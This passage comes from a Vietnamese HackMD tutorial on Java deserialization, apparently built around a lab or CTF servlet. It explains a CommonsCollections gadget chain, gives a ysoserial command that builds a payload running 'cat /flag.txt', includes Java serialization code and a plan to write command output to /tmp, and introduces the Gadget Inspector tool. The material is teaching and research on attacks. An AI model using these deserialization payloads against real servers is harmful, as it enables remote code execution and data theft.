data-size="8">toString</code><span data-position="52228" data-size="1">.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="52229" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HJInrjldlg.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="52229" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="52281" data-size="155">Ta có thể lợi dụng này để hiển thị một thứ gì đấy mà mình mong muốn thay vì phải curl ra ngoài hay ghi file trong server. Ta thấy được ta có thể kích hoạt </span><code data-position="52439" data-size="8">toString</code><span data-position="52450" data-size="11"> ở dòng 18.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="52462" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HkErSig_xe.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="52462" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="52514" data-size="9">Ta đã có </span><strong data-position="52523" data-size="0"><span data-position="52525" data-size="6">Source</span></strong><span data-position="52533" data-size="19"> và có thể coi hàm </span><code data-position="52555" data-size="8">toString</code><span data-position="52566" data-size="3"> ở </span><strong data-position="52569" data-size="0"><span data-position="52571" data-size="10">Utils.java</span></strong><span data-position="52583" data-size="8"> là một </span><strong data-position="52591" data-size="0"><span data-position="52593" data-size="4">Sink</span></strong><span data-position="52600" data-size="49">, nhưng vấn để ở đây là nó chỉ in ra payload, là </span><code data-position="52651" data-size="3">obj</code><span data-position="52657" data-size="136"> mà mình truyền vào, thì lúc này mình sẽ nhớ lại phải kiểm tra thư viện của server, trên thực tế chúng ta cũng phải kiểm tra và nối các </span><strong data-position="52793" data-size="0"><span data-position="52795" data-size="6">Gadget</span></strong><span data-position="52803" data-size="104"> ở các thư viện với nhau, vì mình có source code và thấy được có thư viện commons-collections-3.2.1.jar.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="52908" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HJkhIixuex.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="52908" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="52960" data-size="52">thì với thư viện này, ta thấy trong bộ thư viện của </span><strong data-position="53012" data-size="0"><span data-position="53014" data-size="9">Ysoserial</span></strong></p><p class="part" data-startline="753" data-endline="753" data-position="53028" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="53028" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/Bydo8WPOxe.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="53028" data-size="51" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="756" data-endline="756" data-position="53082" data-size="0"><span data-position="53082" data-size="12">Tuy payload </span><strong data-position="53094" data-size="0"><span data-position="53096" data-size="19">CommonsCollections6</span></strong><span data-position="53117" data-size="17"> có phiên bản là </span><strong data-position="53134" data-size="0"><span data-position="53136" data-size="3">3.1</span></strong><span data-position="53141" data-size="42"> nhưng theo mình tìm hiểu thì ở phiên bản </span><strong data-position="53183" data-size="0"><span data-position="53185" data-size="5">3.2.1</span></strong><span data-position="53192" data-size="14"> của thư viện </span><strong data-position="53206" data-size="0"><span data-position="53208" data-size="19">commons-collections</span></strong><span data-position="53229" data-size="61"> vẫn chưa được vá, vì vậy ta vẫn có thể sử dụng, với payload </span><strong data-position="53290" data-size="0"><span data-position="53292" data-size="19">CommonsCollections1</span></strong><span data-position="53313" data-size="13"> kết hợp với </span><strong data-position="53326" data-size="0"><span data-position="53328" data-size="4">Sink</span></strong><span data-position="53334" data-size="95"> mà chúng ta tìm được, chúng ta có thể hiện thị payload của mình thông qua để JVM tự kích hoạt </span><strong data-position="53429" data-size="0"><span data-position="53431" data-size="12">magic method</span></strong><span data-position="53445" data-size="17"> thay vì chỉ RCE.</span></p><p class="part" data-startline="758" data-endline="758" data-position="53464" data-size="0"><span data-position="53464" data-size="58">Rồi giờ mình hệ thống lại hướng đi mới của chúng ta sẽ là:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="759" data-endline="794" data-infoprefix-length="4" data-position="53523"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="code hljs">VulnServlet.doPost()
    <span class="hljs-operator">|</span>
    v
ObjectInputStream.readObject()
    <span class="hljs-operator">|</span>
    v
HashSet (chứa CommonsCollections6 <span class="hljs-operator">+</span> Utils)
    <span class="hljs-operator">|</span>
    v
CommonsCollections6 [gadget chain]
    <span class="hljs-operator">|</span>
    v
LazyMap.get()
    <span class="hljs-operator">|</span>
    v
ChainedTransformer.transform()
    <span class="hljs-operator">|</span>
    v
InvokerTransformer.transform()    [reflection]
    <span class="hljs-operator">|</span>
    v
Runtime.getRuntime().exec(<span class="hljs-string">"cat /flag.txt"</span>)[kết thúc CommonsCollections1]
        <span class="hljs-operator">|</span>
        v
(capture output into Utils.payload field)
    <span class="hljs-operator">|</span>
    v
Utils.toString()
    <span class="hljs-operator">|</span>
    v
response.getWriter().println(<span class="hljs-string">"Deserialization success: "</span> <span class="hljs-operator">+</span> obj)
    <span class="hljs-operator">|</span>
    v
In ra <span class="hljs-string">"Payload executed: FLAG{...}"</span>
</code></pre>
      </div><p class="part" data-startline="796" data-endline="796" data-position="54130" data-size="0"><span data-position="54130" data-size="111">Sau khi hệ thống được hướng đi, bây giờ mình sẽ chia thành hai quy trình cho các bạn dễ hiểu, quy trình một là </span><strong data-position="54241" data-size="0"><span data-position="54243" data-size="30">tạo phần gadget chain đầu tiên</span></strong><span data-position="54275" data-size="27"> (CommonsCollections6) với </span><strong data-position="54302" data-size="0"><span data-position="54304" data-size="9">ysoserial</span></strong><span data-position="54315" data-size="82"> → lưu ra file payload để hướng dẫn dùng công cụ này. Sau đó đến quy trình hai là </span><strong data-position="54397" data-size="0"><span data-position="54399" data-size="33">viết Java code để mở file payload</span></strong><span data-position="54435" data-size="45">, nối thêm dữ liệu serialize của Utils("FLAG{</span><span class="smartypants" data-position="54479" data-size="3">…</span><span data-position="54483" data-size="20">}") vào ngay sau đó.</span></p><p class="part" data-startline="798" data-endline="798" data-position="54505" data-size="0"><span data-position="54505" data-size="15">Sau khi đã tải </span><strong data-position="54520" data-size="0"><span data-position="54522" data-size="9">ysoserial</span></strong><span data-position="54533" data-size="63"> rồi thì các bạn mở lên và chạy payload (CommonsCollections6): </span><code data-position="54599" data-size="75">java -jar ysoserial-all.jar CommonsCollections6 "cat /flag.txt" &gt; part1.ser</code></p><p class="part" data-startline="800" data-endline="800" data-position="54679" data-size="0"><span data-position="54679" data-size="106">Rồi giờ mình đã có thể RCE nếu mà gửi file này lên server rồi, tiếp theo mình sẽ tạo thử payload thứ 2 là </span><code data-position="54788" data-size="9">part2.ser</code><span data-position="54800" data-size="17"> để test thử cái </span><strong data-position="54817" data-size="0"><span data-position="54819" data-size="11">gadgetchain</span></strong><span data-position="54832" data-size="60"> này có hoạt động theo ý muốn của mình không trước khi dùng </span><code data-position="54895" data-size="7">Hashset</code><span data-position="54905" data-size="11"> kết hợp 2 </span><strong data-position="54916" data-size="0"><span data-position="54918" data-size="11">gadgetchain</span></strong><span data-position="54931" data-size="5"> này:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="801" data-endline="815" data-infoprefix-length="4" data-position="54937"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>vuln</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SerializeUtils</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Utils</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Utils</span><span class="token punctuation">(</span><span class="token string">"FLAG{flag}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"part2.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
      </div><p class="part" data-startline="816" data-endline="818" data-position="55329" data-size="0"><span data-position="55329" data-size="62">Sau khi bạn có được part1.ser và part2.ser ta thấy kết quả là:</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="55392" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rkHlk4vull.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="55392" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="55444" data-size="53">đến đây có vẻ ra gần đúng với ý chúng ta rồi nhưng ở </span><code data-position="55500" data-size="9">part2.ser</code><span data-position="55512" data-size="36"> không ra kết quả mình mong muốn là </span><code data-position="55551" data-size="21">Payload executed:....</code><span data-position="55576" data-size="26">, nguyên nhân ở đây là vì </span><code data-position="55604" data-size="24">obj.getClass().getName()</code><span data-position="55631" data-size="10"> gọi đúng </span><code data-position="55644" data-size="15">Class.getName()</code><span data-position="55662" data-size="14"> và không gọi </span><code data-position="55679" data-size="14">obj.toString()</code><span data-position="55696" data-size="24"> như vậy mình không thể </span><strong data-position="55720" data-size="0"><span data-position="55722" data-size="8">override</span></strong><span data-position="55732" data-size="6"> bằng </span><code data-position="55741" data-size="10">toString()</code><span data-position="55755" data-size="69">, bây giờ thì mình có thể dùng CC6 để RCE rồi nhưng nếu các bạn muốn </span><strong data-position="55823" data-size="0"><span data-position="55825" data-size="8">override</span></strong><span data-position="55835" data-size="39"> để in ra kết quả mình muốn bằng class </span><code data-position="55877" data-size="6">Untils</code><span data-position="55886" data-size="13"> thì dựa vào </span><strong data-position="55899" data-size="0"><span data-position="55901" data-size="3">CC6</span></strong><span data-position="55907" data-size="14">, ta lợi dụng </span><strong data-position="55920" data-size="0"><span data-position="55922" data-size="10">reflection</span></strong><span data-position="55934" data-size="7"> trong </span><code data-position="55944" data-size="18">InvokerTransformer</code><span data-position="55965" data-size="6"> hoặc </span><code data-position="55974" data-size="19">ReflectionExtractor</code><span data-position="55996" data-size="4"> là </span><strong data-position="56000" data-size="0"><span data-position="56002" data-size="6">bridge</span></strong><span data-position="56010" data-size="24"> để mình gọi được field </span><code data-position="56037" data-size="8">toString</code><span data-position="56048" data-size="11"> của class </span><code data-position="56062" data-size="6">Untils</code><span data-position="56071" data-size="23"> có nghĩa là thay vì ở </span><strong data-position="56094" data-size="0"><span data-position="56096" data-size="3">CC6</span></strong><span data-position="56101" data-size="11"> gọi thẳng </span><code data-position="56115" data-size="12">Runtime.exec</code><span data-position="56130" data-size="38"> như trong các chain gốc thì mình gọi </span><code data-position="56171" data-size="16">Utils.toString()</code><span data-position="56191" data-size="32">, nhưng hướng này lại không thể </span><strong data-position="56222" data-size="0"><span data-position="56224" data-size="3">RCE</span></strong><span data-position="56230" data-size="150">, nếu bạn muốn vừa có thể RCE và in ra luôn thì cách này tương đối phức tạp, và chạy nhiều lần mình không khuyến khích lắm, tương đối ý tưởng như này:</span></p><ol class="part" data-startline="819" data-endline="825" data-position="56380" data-size="0" style="padding-left: 2em;">
<li class="" data-startline="819" data-endline="819" data-position="56383" data-size="0"><span data-position="56383" data-size="25">Thực thi lệnh RCE, ví dụ </span><code data-position="56411" data-size="34">bash -c 'cat /flag.txt &gt; /tmp/out'</code><span data-position="56449" data-size="1">.</span></li>
<li class="" data-startline="820" data-endline="820" data-position="56453" data-size="0"><span data-position="56453" data-size="18">Đợi lệnh kết thúc.</span></li>
<li class="" data-startline="821" data-endline="821" data-position="56475" data-size="0"><span data-position="56475" data-size="92">Đọc file /tmp/out thành byte[] bằng java.nio.file.Files.readAllBytes(Paths.get("/tmp/out")).</span></li>
<li class="" data-startline="822" data-endline="822" data-position="56571" data-size="0"><span data-position="56571" data-size="31">Chuyển byte[] → String (UTF-8).</span></li>
<li class="" data-startline="823" data-endline="823" data-position="56606" data-size="0"><span data-position="56606" data-size="36">Dùng reflection gán Utils.payload = </span>&lt;String&gt;<span data-position="56650" data-size="15"> trên instance </span><code data-position="56668" data-size="5">Utils</code><span data-position="56676" data-size="14"> (đã có trong </span><strong data-position="56690" data-size="0"><span data-position="56692" data-size="12">object-graph</span></strong><span data-position="56706" data-size="10"> payload).</span></li>
<li class="" data-startline="824" data-endline="825" data-position="56720" data-size="0"><span data-position="56720" data-size="140">Trả về deserialization; nếu server sau đó in obj (hoặc HashSet.toString() gọi Utils.toString()), bạn sẽ thấy "Payload executed: " + payload.</span></li>
</ol><p class="part" data-startline="826" data-endline="833" data-position="56866" data-size="0"><span data-position="56866" data-size="153">Nhưng bước này khá là phức tạp nên mình chỉ nói về ý tưởng các bạn có thể thực hiện hoặc bỏ qua. Và giờ bước tiếp mình sẽ hướng dẫn các bạn sử dụng tool </span><strong data-position="57019" data-size="0"><span data-position="57021" data-size="16">Gadget Inspector</span></strong><span data-position="57040" data-size="18">. Đây là một tool </span><strong data-position="57057" data-size="0"><span data-position="57059" data-size="13">code analyzer</span></strong><span data-position="57074" data-size="187"> để tìm gadget chain nên mình sẽ hướng dẫn kĩ cách các bạn dùng nó để phân tích mã nguồn. Với tool này thì cài đặt sẽ khá khó khăn một chút, sau khi cài xong trên github, muốn dùng nó để </span><strong data-position="57261" data-size="0"><span data-position="57263" data-size="18">phân tích mã nguồn</span></strong><span data-position="57284" data-size="61">, bạn phải chuyển tất cả thư viện và các file .class thành 1 </span><strong data-position="57344" data-size="0"><span data-position="57346" data-size="8">file JAR</span></strong><span data-position="57356" data-size="5"> lớn:</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="57362" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HknuOstdxx.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="57362" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="57414" data-size="38">Sau đấy chúng ta vào folder chứa tool </span><strong data-position="57452" data-size="0"><span data-position="57454" data-size="16">Gadget Inspector</span></strong><span data-position="57472" data-size="55"> và chạy để nó phân tích bằng lệnh mà mình hay dùng là:</span><br>
<code data-position="57531" data-size="58">java -Xmx2g -jar gadget-inspector-all.jar app.jar libs.jar</code><br>
<span data-position="57593" data-size="32">là công cụ này sẽ phân tích tìm </span><strong data-position="57625" data-size="0"><span data-position="57627" data-size="12">gadget chain</span></strong><span data-position="57641" data-size="10"> ở 2 file </span><strong data-position="57651" data-size="0"><span data-position="57653" data-size="7">app.jar</span></strong><span data-position="57662" data-size="4"> và </span><strong data-position="57666" data-size="0"><span data-position="57668" data-size="7">lib.jar</span></strong><span data-position="57677" data-size="27"> do mình tạo tương ứng với </span><strong data-position="57704" data-size="0"><span data-position="57706" data-size="6">source</span></strong><span data-position="57714" data-size="22"> và thư viện mình xài.</span><br>
<span data-position="57737" data-size="54">Khi chạy xong thì các bạn sẽ thấy tool trả về như này:</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="57792" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/H1BWcTKOel.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="57792" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="57844" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 